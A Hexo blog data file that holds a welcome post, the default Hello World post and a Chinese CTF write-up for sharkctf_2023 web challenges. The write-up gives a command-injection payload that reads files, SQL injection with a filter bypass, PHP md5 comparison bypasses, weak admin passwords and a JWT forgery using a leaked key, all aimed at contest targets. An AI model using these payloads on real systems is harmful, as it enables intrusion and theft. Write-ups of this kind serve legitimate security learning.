blog.</p>\n<p>搭建了一天，终于上线了。</p>\n<p>暑假开始的时候有一个Plan，完成了个P,因为lan。</p>\n<p>后面会随缘更新，更新内容也不确定。凑合着看吧。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>Welcome to my blog.</p>\n<p>搭建了一天，终于上线了。</p>\n<p>暑假开始的时候有一个Plan，完成了个P,因为lan。</p>\n<p>后面会随缘更新，更新内容也不确定。凑合着看吧。</p>\n"},{"title":"Hello World","_content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","source":"_posts/hello-world.md","raw":"---\ntitle: Hello World\n---\nWelcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","slug":"hello-world","published":1,"date":"2023-08-20T03:25:19.518Z","updated":"2023-08-20T03:25:19.518Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cllyqxkz900061ao55rnr60so","content":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><pre><code class=\"bash\">$ hexo new &quot;My New Post&quot;\n</code></pre>\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><pre><code class=\"bash\">$ hexo server\n</code></pre>\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><pre><code class=\"bash\">$ hexo generate\n</code></pre>\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><pre><code class=\"bash\">$ hexo deploy\n</code></pre>\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><pre><code class=\"bash\">$ hexo new &quot;My New Post&quot;\n</code></pre>\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><pre><code class=\"bash\">$ hexo server\n</code></pre>\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><pre><code class=\"bash\">$ hexo generate\n</code></pre>\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><pre><code class=\"bash\">$ hexo deploy\n</code></pre>\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n"},{"title":"sharkctf_2023","date":"2023-08-22T04:51:24.000Z","_content":"\n`暑假事情有点多，没啥时间写，只写完了web题，写篇wp水水博客。`\n\n---\n## 彩蛋\n1azy_fish加了彩蛋，找一找？不用爆破（把服务器日坏了就不好玩了\n\n### 敏感路径\n这题刚开始看以为是F12题，一直没找到，后来翻插件发现有敏感目录 /goat。\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.09.03.png)\n推荐一下这个插件：findsomething（尊嘟很好用）\n\n### F12查看网页源码\n直接拼接就是一个F12题了，F12查看源码得到flag\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.07.01.png)\n\n\n\n## Ez_http\nVidocQwQ说http好简单，我们一起学习吧。\n\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.12.24.png)\n\n### XFF头ip绕过\n使用hackbar进行操作添加XFF头。\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.15.43.png)\n\n### Referer来源绕过\n\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.17.39.png)\n\n### UA绕过\nUA头一般用来确定浏览器类型\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.19.12.png)\n\n\n## view source\nVidocQwQ邀请你一起打游戏辣，2048都会吧？\n\n### 查看源码\n看题目意思应该是要查看源码，但是禁用了F12和右键。\n不过可以通过谷歌浏览器的设置打开开发者工具\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.24.19.png)\n源码发现提示hint.php\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.25.33.png)\n\n### 源码查询发现路由及参数\n直接拼接访问的话发现什么也没有。\n于是回到前面查看源码，但是代码有点长。\n于是猜测hint.php是否用以传递成绩参数之类的，全局搜索看看是否有暴露相关路由。\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.30.16.png)\n发现相关源码，于是直接可以拼接获得flag\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.32.50.png)\n\n## Ez_eval\nVidocQwQ写了个php，留下了一个函数，你们知道怎么使用吗？\n\n###  开局送源码\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.34.04.png)\n审计发现通过word传参命令执行，过滤flag字段。\n### 通配符绕过\n`?word=system(\"cat /f*\");`\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.37.01.png)\n\n## Ez_SQL\n### 手工做法：\n#### 查看源码有提示\n提示将select替换为空。\n绕过办法：分拆绕过，过滤时重组形成payload\n#### 构造语句\n先order by 确定一下字段数，\n`username=123'order by 4--+`\n发现字段为4。使用hackerbar辅助构造payload\n```username=123'union selselectect group_concat(schema_name),2,3,4 from information_schema.schemata-+```\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.46.22.png)\n然后就使用相同方式构造注入语句拿下flag。\n\n### 工具梭哈\nsqlmap一把梭，具体使用就自己查一查了哈。\n\n\n## 哈斯哈斯哈斯（bt\n1azy_fish觉得md5很好用，就用一堆md5保护了flag，使它不被坏人拿走。\n\n### 弱口令\n开局一个登录框，弱口令是试一下，得到：\nadmin:admin\n\n### 查看源码+传参\n跳转后页面看看源码得到提示。\n`你给我hint我给你hint`\n猜测传参hint。\n\n### php审计\n\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.55.11.png)\n\n\n```php\n<?php  \nerror_reporting(0);  \nrequire_once('/flag.php');   \nif(isset($_GET['hint'])){    highlight_file(__FILE__);  \n}  \nelse{  \n    include_once \"loginok.html\";  \n}  \n$a=$_GET['a'];  \n$b=$_GET['b'];  \n$hash=$_COOKIE['hash'];  \n$word=$_POST['word'];  \nif($a !== $b & md5($a) === md5($b)){  \n    echo ' WOW,u are so cool ';  \n    echo strlen($flag);  \n}  \nif (preg_match('/^1952(.*?)NUAA$/', $word)){  \n    if(intval($word) === intval(strrev($word))){  \n        echo \" 宝贝,flag快出来了哦,加油捏 \";  \n        echo md5($flag);  \n    }  \n}  \nif ($hash === md5($flag . $word))  \n      echo \" Wooooooo!You cracked the md5. Here is your flag \" . $flag;  \n?>\n```\n\n\n```php\n大概有三层判断：\n1`.if($a !== $b & md5($a) === md5($b)){`\n2`.`if (preg_match('/^1952(.*?)NUAA$/', $word)){  \n    if(intval($word) === intval(strrev($word))){``\n3`.if ($hash === md5($flag . $word))`\n```\n\n### 1. 值不相同但md5加密后相同（数组绕过md5强比较）\n- 通过数组类型一致，但值不一致。\n- md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。\n- 中间的为什么是&而不是&&。在此题当中都是成立的，详细的说明可以查看<a href=https://www.runoob.com/note/34429>菜鸟教程</a>\n\n### 2.1952开头NUAA结尾，倒序并interval()后仍相同\n- 正常进行输入的情况如下： ![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2020.54.27.png)\n相关定义可以自己去查一下（我懒）\n\n大概思路: 正序的字符串比较好控制大小，而倒序的感觉有点难办。\n小trick：科学计数法\n我们可以通过科学计数法使得正向的字符串经过intval后变为0也就实现了绕过。\n\npayload:\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2021.05.58.png)\n\n得到md5值\n\n### 3.word置空进行绕过。\n这里就不要想的太复杂哈哈哈哈哈哈哈。还得是小小姐。\nword参数直接置空并且加上hash就可以得到flag了。\n\n下班！\n\n\n## 伤身体（ssti\n1azy_fish沉迷于某六字游戏，在他大意的时候，快偷了他的flag！！！\n\n### 弱口令登入\nadmin:password\n\n### ssti注入\nssti注入我就大概知道个原理，于是呢就直接工具梭哈啦。\n打开fenjing直接一把嗦，具体用法自己查一下吧。\n\n\n## 来抽个奖？\n1azy_fish觉得有随机数在，他就不会亏卡，快爆了他，让他血本无归。\n\n#### php伪随机数漏洞\n多次刷新发现随机数始终相同，于是猜测肯定使用的同一个种子。漏洞请往下翻翻。\n\n### 爆破种子\n\n爆破种子工具包 <a href=https://github.com/openwall/php_mt_seed>php_mt_seed</a>\n使用教程看看README就行。\n\n\n### 漏洞了解\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2021.21.05.png)\n\n```php\n<?php  \nmt_srand(5201314);  \necho mt_rand().PHP_EOL;  \necho mt_rand().PHP_EOL;  \necho mt_rand().PHP_EOL;  \necho mt_rand().PHP_EOL;  \n?>\n```\n可以通过多次实验发现相同种子下，都是相同的数据，相同的顺序。\n\n下班！\n\n## 我不是op！\n1azy_fish说他自己不是op，你可以登录它的管理员账号看看他到底是不是op吗？\n\n尝试弱口令无果后随便打一个用户名，发现返回包\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-17%2012.01.55.png)\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-17%2012.02.06.png)\n得到token一眼jwt，同时解编码message上面的unicode\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-17%2012.03.32.png)\n然后带这个token去/protected\n需要注意的点（这个token是jwt，需要放在cookie里面进行传参）\n使用GET请求\n\n构造后的burp请求包：\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-17%2012.07.12.png)\n\n```\nGET http://101.42.30.15:8306/protected HTTP/1.1\nHost: 101.42.30.15:8306\nPragma: no-cache\nCache-Control: no-cache  \nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\\*/\\*;q=0.8,application/signed-exchange;v=b3;q=0.7   \nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7\nCookie: session=7fa98980-e33f-4e0b-9213-4c1616d16f94.62XYmGmHDaMHpnRNYQEY--rTTK0; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluJyJ9.ATUoxudr6sa0eNyMUQqU155AeGVsuv90_CM-T_WVlKM\nsec-ch-ua-platform: \"Windows\"\nsec-ch-ua: \"Google Chrome\";v=\"113\", \"Chromium\";v=\"113\", \"Not=A?Brand\";v=\"24\" \nsec-ch-ua-mobile: ?0\nConnection: close\n```\n返回包里\n`<!--secret_key = \"Lazy_fish_Is_op?\"-->`\n应该就是jwt的密钥了\n于是直接找个在线jwt网站篡改一下jwt就可以越权到admin了(网站： https://jwt.io/)\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-17%2012.12.01.png)\n直接修改111为admin然后得到admin的 jwt\n带这admin的jwt重新访问即可得到flag\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-17%2012.13.50.png)\n\n\nShark{1aZyfish_is_0pppppppppp!}","source":"_posts/sharkctf_2023.md","raw":"---\ntitle: sharkctf_2023\ndate: 2023-08-22 12:51:24\ntags:\n- writeup\n- web\ncategories:\n- ctf\n---\n\n`暑假事情有点多，没啥时间写，只写完了web题，写篇wp水水博客。`\n\n---\n## 彩蛋\n1azy_fish加了彩蛋，找一找？不用爆破（把服务器日坏了就不好玩了\n\n### 敏感路径\n这题刚开始看以为是F12题，一直没找到，后来翻插件发现有敏感目录 /goat。\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.09.03.png)\n推荐一下这个插件：findsomething（尊嘟很好用）\n\n### F12查看网页源码\n直接拼接就是一个F12题了，F12查看源码得到flag\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.07.01.png)\n\n\n\n## Ez_http\nVidocQwQ说http好简单，我们一起学习吧。\n\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.12.24.png)\n\n### XFF头ip绕过\n使用hackbar进行操作添加XFF头。\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.15.43.png)\n\n### Referer来源绕过\n\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.17.39.png)\n\n### UA绕过\nUA头一般用来确定浏览器类型\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.19.12.png)\n\n\n## view source\nVidocQwQ邀请你一起打游戏辣，2048都会吧？\n\n### 查看源码\n看题目意思应该是要查看源码，但是禁用了F12和右键。\n不过可以通过谷歌浏览器的设置打开开发者工具\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.24.19.png)\n源码发现提示hint.php\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.25.33.png)\n\n### 源码查询发现路由及参数\n直接拼接访问的话发现什么也没有。\n于是回到前面查看源码，但是代码有点长。\n于是猜测hint.php是否用以传递成绩参数之类的，全局搜索看看是否有暴露相关路由。\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.30.16.png)\n发现相关源码，于是直接可以拼接获得flag\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.32.50.png)\n\n## Ez_eval\nVidocQwQ写了个php，留下了一个函数，你们知道怎么使用吗？\n\n###  开局送源码\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.34.04.png)\n审计发现通过word传参命令执行，过滤flag字段。\n### 通配符绕过\n`?word=system(\"cat /f*\");`\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.37.01.png)\n\n## Ez_SQL\n### 手工做法：\n#### 查看源码有提示\n提示将select替换为空。\n绕过办法：分拆绕过，过滤时重组形成payload\n#### 构造语句\n先order by 确定一下字段数，\n`username=123'order by 4--+`\n发现字段为4。使用hackerbar辅助构造payload\n```username=123'union selselectect group_concat(schema_name),2,3,4 from information_schema.schemata-+```\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.46.22.png)\n然后就使用相同方式构造注入语句拿下flag。\n\n### 工具梭哈\nsqlmap一把梭，具体使用就自己查一查了哈。\n\n\n## 哈斯哈斯哈斯（bt\n1azy_fish觉得md5很好用，就用一堆md5保护了flag，使它不被坏人拿走。\n\n### 弱口令\n开局一个登录框，弱口令是试一下，得到：\nadmin:admin\n\n### 查看源码+传参\n跳转后页面看看源码得到提示。\n`你给我hint我给你hint`\n猜测传参hint。\n\n### php审计\n\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.55.11.png)\n\n\n```php\n<?php  \nerror_reporting(0);  \nrequire_once('/flag.php');   \nif(isset($_GET['hint'])){    highlight_file(__FILE__);  \n}  \nelse{  \n    include_once \"loginok.html\";  \n}  \n$a=$_GET['a'];  \n$b=$_GET['b'];  \n$hash=$_COOKIE['hash'];  \n$word=$_POST['word'];  \nif($a !== $b & md5($a) === md5($b)){  \n    echo ' WOW,u are so cool ';  \n    echo strlen($flag);  \n}  \nif (preg_match('/^1952(.*?)NUAA$/', $word)){  \n    if(intval($word) === intval(strrev($word))){  \n        echo \" 宝贝,flag快出来了哦,加油捏 \";  \n        echo md5($flag);  \n    }  \n}  \nif ($hash === md5($flag . $word))  \n      echo \" Wooooooo!You cracked the md5. Here is your flag \" . $flag;  \n?>\n```\n\n\n```php\n大概有三层判断：\n1`.if($a !== $b & md5($a) === md5($b)){`\n2`.`if (preg_match('/^1952(.*?)NUAA$/', $word)){  \n    if(intval($word) === intval(strrev($word))){``\n3`.if ($hash === md5($flag . $word))`\n```\n\n### 1. 值不相同但md5加密后相同（数组绕过md5强比较）\n- 通过数组类型一致，但值不一致。\n- md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。\n- 中间的为什么是&而不是&&。在此题当中都是成立的，详细的说明可以查看<a href=https://www.runoob.com/note/34429>菜鸟教程</a>\n\n### 2.1952开头NUAA结尾，倒序并interval()后仍相同\n- 正常进行输入的情况如下： ![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2020.54.27.png)\n相关定义可以自己去查一下（我懒）\n\n大概思路: 正序的字符串比较好控制大小，而倒序的感觉有点难办。\n小trick：科学计数法\n我们可以通过科学计数法使得正向的字符串经过intval后变为0也就实现了绕过。\n\npayload:\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2021.05.58.png)\n\n得到md5值\n\n### 3.word置空进行绕过。\n这里就不要想的太复杂哈哈哈哈哈哈哈。还得是小小姐。\nword参数直接置空并且加上hash就可以得到flag了。\n\n下班！\n\n\n## 伤身体（ssti\n1azy_fish沉迷于某六字游戏，在他大意的时候，快偷了他的flag！！！\n\n### 弱口令登入\nadmin:password\n\n### ssti注入\nssti注入我就大概知道个原理，于是呢就直接工具梭哈啦。\n打开fenjing直接一把嗦，具体用法自己查一下吧。\n\n\n## 来抽个奖？\n1azy_fish觉得有随机数在，他就不会亏卡，快爆了他，让他血本无归。\n\n#### php伪随机数漏洞\n多次刷新发现随机数始终相同，于是猜测肯定使用的同一个种子。漏洞请往下翻翻。\n\n### 爆破种子\n\n爆破种子工具包 <a href=https://github.com/openwall/php_mt_seed>php_mt_seed</a>\n使用教程看看README就行。\n\n\n### 漏洞了解\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2021.21.05.png)\n\n```php\n<?php  \nmt_srand(5201314);  \necho mt_rand().PHP_EOL;  \necho mt_rand().PHP_EOL;  \necho mt_rand().PHP_EOL;  \necho mt_rand().PHP_EOL;  \n?>\n```\n可以通过多次实验发现相同种子下，都是相同的数据，相同的顺序。\n\n下班！\n\n## 我不是op！\n1azy_fish说他自己不是op，你可以登录它的管理员账号看看他到底是不是op吗？\n\n尝试弱口令无果后随便打一个用户名，发现返回包\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-17%2012.01.55.png)\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-17%2012.02.06.png)\n得到token一眼jwt，同时解编码message上面的unicode\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-17%2012.03.32.png)\n然后带这个token去/protected\n需要注意的点（这个token是jwt，需要放在cookie里面进行传参）\n使用GET请求\n\n构造后的burp请求包：\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-17%2012.07.12.png)\n\n```\nGET http://101.42.30.15:8306/protected HTTP/1.1\nHost: 101.42.30.15:8306\nPragma: no-cache\nCache-Control: no-cache  \nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\\*/\\*;q=0.8,application/signed-exchange;v=b3;q=0.7   \nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7\nCookie: session=7fa98980-e33f-4e0b-9213-4c1616d16f94.62XYmGmHDaMHpnRNYQEY--rTTK0; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluJyJ9.ATUoxudr6sa0eNyMUQqU155AeGVsuv90_CM-T_WVlKM\nsec-ch-ua-platform: \"Windows\"\nsec-ch-ua: \"Google Chrome\";v=\"113\", \"Chromium\";v=\"113\", \"Not=A?Brand\";v=\"24\" \nsec-ch-ua-mobile: ?0\nConnection: close\n```\n返回包里\n`<!--secret_key = \"Lazy_fish_Is_op?\"-->`\n应该就是jwt的密钥了\n于是直接找个在线jwt网站篡改一下jwt就可以越权到admin了(网站： https://jwt.io/)\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-17%2012.12.01.png)\n直接修改111为admin然后得到admin的 jwt\n带这admin的jwt重新访问即可得到flag\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-17%2012.13.50.png)\n\n\nShark{1aZyfish_is_0pppppppppp!}","slug":"sharkctf_2023","published":1,"updated":"2023-08-24T10:02:48.696Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cllyqxkza00081ao55wuybybs","content":"<p><code>暑假事情有点多，没啥时间写，只写完了web题，写篇wp水水博客。</code></p>\n<hr>\n<h2 id=\"彩蛋\"><a href=\"#彩蛋\" class=\"headerlink\" title=\"彩蛋\"></a>彩蛋</h2><p>1azy_fish加了彩蛋，找一找？不用爆破（把服务器日坏了就不好玩了</p>\n<h3 id=\"敏感路径\"><a href=\"#敏感路径\" class=\"headerlink\" title=\"敏感路径\"></a>敏感路径</h3><p>这题刚开始看以为是F12题，一直没找到，后来翻插件发现有敏感目录 &#x2F;goat。<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.09.03.png\"><br>推荐一下这个插件：findsomething（尊嘟很好用）</p>\n<h3 id=\"F12查看网页源码\"><a href=\"#F12查看网页源码\" class=\"headerlink\" title=\"F12查看网页源码\"></a>F12查看网页源码</h3><p>直接拼接就是一个F12题了，F12查看源码得到flag<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.07.01.png\"></p>\n<h2 id=\"Ez-http\"><a href=\"#Ez-http\" class=\"headerlink\" title=\"Ez_http\"></a>Ez_http</h2><p>VidocQwQ说http好简单，我们一起学习吧。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.12.24.png\"></p>\n<h3 id=\"XFF头ip绕过\"><a href=\"#XFF头ip绕过\" class=\"headerlink\" title=\"XFF头ip绕过\"></a>XFF头ip绕过</h3><p>使用hackbar进行操作添加XFF头。<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.15.43.png\"></p>\n<h3 id=\"Referer来源绕过\"><a href=\"#Referer来源绕过\" class=\"headerlink\" title=\"Referer来源绕过\"></a>Referer来源绕过</h3><p><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.17.39.png\"></p>\n<h3 id=\"UA绕过\"><a href=\"#UA绕过\" class=\"headerlink\" title=\"UA绕过\"></a>UA绕过</h3><p>UA头一般用来确定浏览器类型<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.19.12.png\"></p>\n<h2 id=\"view-source\"><a href=\"#view-source\" class=\"headerlink\" title=\"view source\"></a>view source</h2><p>VidocQwQ邀请你一起打游戏辣，2048都会吧？</p>\n<h3 id=\"查看源码\"><a href=\"#查看源码\" class=\"headerlink\" title=\"查看源码\"></a>查看源码</h3><p>看题目意思应该是要查看源码，但是禁用了F12和右键。<br>不过可以通过谷歌浏览器的设置打开开发者工具<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.24.19.png\"><br>源码发现提示hint.php<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.25.33.png\"></p>\n<h3 id=\"源码查询发现路由及参数\"><a href=\"#源码查询发现路由及参数\" class=\"headerlink\" title=\"源码查询发现路由及参数\"></a>源码查询发现路由及参数</h3><p>直接拼接访问的话发现什么也没有。<br>于是回到前面查看源码，但是代码有点长。<br>于是猜测hint.php是否用以传递成绩参数之类的，全局搜索看看是否有暴露相关路由。<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.30.16.png\"><br>发现相关源码，于是直接可以拼接获得flag<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.32.50.png\"></p>\n<h2 id=\"Ez-eval\"><a href=\"#Ez-eval\" class=\"headerlink\" title=\"Ez_eval\"></a>Ez_eval</h2><p>VidocQwQ写了个php，留下了一个函数，你们知道怎么使用吗？</p>\n<h3 id=\"开局送源码\"><a href=\"#开局送源码\" class=\"headerlink\" title=\"开局送源码\"></a>开局送源码</h3><p><img 